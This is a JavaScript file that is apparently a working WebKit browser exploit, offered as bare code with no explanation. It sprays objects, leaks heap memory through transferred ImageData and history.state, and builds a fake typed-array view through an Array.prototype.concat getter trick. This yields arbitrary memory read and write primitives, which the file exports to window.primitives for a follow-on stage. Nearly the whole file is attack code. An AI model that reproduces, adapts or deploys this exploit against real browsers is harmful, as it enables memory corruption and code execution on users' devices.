function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < 8; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
};

var instancespr = [];

for (var i = 0; i < 4096; i++) {
    instancespr[i] = new Uint32Array(1);
    instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
}

var _dview;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}
var dgc = function () {
    for (var i = 0; i < 0x100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    this.toPacked = function () {
        return {
            hi: this.hi,
            low: this.low
        };
    }

    this.setPacked = function (pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

var nogc = [];

var fail = function () {
    alert.apply(null, arguments);
    throw "fail";
}

// Target JSObject for overlap
var tgt = {
    a: 0,
    b: 0,
    c: 0,
    d: 0
}

var y = new ImageData(1, 0x4000)
postMessage("", "*", [y.data.buffer]);

// Spray properties to ensure object is fastmalloc()'d and can be found easily later
var props = {};

for (var i = 0;
    (i < (0x4000 / 2));) {
    props[i++] = {
        value: 0x42424242
    };
    props[i++] = {
        value: tgt
    };
}

var foundLeak = undefined;
var foundIndex = 0;
var maxCount = 0x100;

while (foundLeak == undefined && maxCount > 0) {
    maxCount--;

    history.pushState(y, "");

    Object.defineProperties({}, props);

    var leak = new Uint32Array(history.state.data.buffer);

    for (var i = 0; i < leak.length - 6; i++) {
        if (
            leak[i] == 0x42424242 &&
            leak[i + 0x1] == 0xFFFF0000 &&
            leak[i + 0x2] == 0x00000000 &&
            leak[i + 0x3] == 0x00000000 &&
            leak[i + 0x4] == 0x00000000 &&
            leak[i + 0x5] == 0x00000000 &&
            leak[i + 0x6] == 0x0000000E &&
            leak[i + 0x7] == 0x00000000 &&
            leak[i + 0xA] == 0x00000000 &&
            leak[i + 0xB] == 0x00000000 &&
            leak[i + 0xC] == 0x00000000 &&
            leak[i + 0xD] == 0x00000000 &&
            leak[i + 0xE] == 0x0000000E &&
            leak[i + 0xF] == 0x00000000
        ) {
            foundIndex = i;
            foundLeak = leak;
            break;
        }
    }
}

if (!foundLeak) {
    failed = true
    fail("Failed to find leak!")
}

var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);

Array.prototype.__defineGetter__(100, () => 1);

var f = document.body.appendChild(document.createElement('iframe'));
var a = new f.contentWindow.Array(13.37, 13.37);
var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);

var master = new Uint32Array(0x1000);
var slave = new Uint32Array(0x1000);
var leakval_u32 = new Uint32Array(0x1000);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// Create fake ArrayBufferView
tgt.a = u2d(2048, 0x1602300);
tgt.b = 0;
tgt.c = leakval_helper;
tgt.d = 0x1337;

var c = Array.prototype.concat.call(a, b);
document.body.removeChild(f);
var hax = c[0];
c[0] = 0;

tgt.c = c;

hax[2] = 0;
hax[3] = 0;

Object.defineProperty(Array.prototype, 100, {
    get: undefined
});

tgt.c = leakval_helper;
var butterfly = new int64(hax[2], hax[3]);
butterfly.low += 0x10;

tgt.c = leakval_u32;
var lkv_u32_old = new int64(hax[4], hax[5]);
hax[4] = butterfly.low;
hax[5] = butterfly.hi;
// Setup read/write primitive

tgt.c = master;
hax[4] = leakval_u32[0];
hax[5] = leakval_u32[1];

var addr_to_slavebuf = new int64(master[4], master[5]);
tgt.c = leakval_u32;
hax[4] = lkv_u32_old.low;
hax[5] = lkv_u32_old.hi;

tgt.c = 0;
hax = 0;

var prim = {
    write8: function (addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        if (val instanceof int64) {
            slave[0] = val.low;
            slave[1] = val.hi;
        } else {
            slave[0] = val;
            slave[1] = 0;
        }

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
    },

    write4: function (addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        slave[0] = val;

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
    },

    read8: function (addr) {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = new int64(slave[0], slave[1]);

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
    },

    read4: function (addr) {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = slave[0];

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
    },

    leakval: function (jsval) {
        leakval_helper[0] = jsval;
        var rtv = this.read8(butterfly);
        this.write8(butterfly, new int64(0x41414141, 0xffff0000));

        return rtv;
    },

    createval: function (jsval) {
        this.write8(butterfly, jsval);
        var rt = leakval_helper[0];
        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
        return rt;
    }
};

window.primitives = prim;
if (window.postExpl) window.postExpl();
